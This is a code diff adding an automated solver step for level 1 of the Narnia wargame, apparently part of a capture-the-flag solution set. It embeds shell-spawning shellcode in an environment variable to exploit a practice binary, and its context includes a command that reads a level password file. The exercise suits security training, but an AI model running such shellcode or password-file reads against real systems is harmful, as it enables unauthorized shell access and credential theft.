@@ -29,3 +29,14 @@ class Solver(solver_util.AbstractSolver):
         "      sleep 1 && echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0")
     proc.expect(r'\$ ')
     return proc.before.splitlines()[6]
+
+  @_get_password_from_shell
+  def level1(self, proc):
+    # From http://shell-storm.org/shellcode/files/shellcode-863.php
+    shellcode = (r"\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d"
+                 r"\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50"
+                 r"\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f"
+                 r"\x2f\x62\x69\x6e\x2f\x73\x68")
+    proc.sendline('export EGG=`echo -e "{}"`'.format(shellcode))
+    proc.expect(r'\$ ')
+    proc.sendline('/narnia/narnia1')
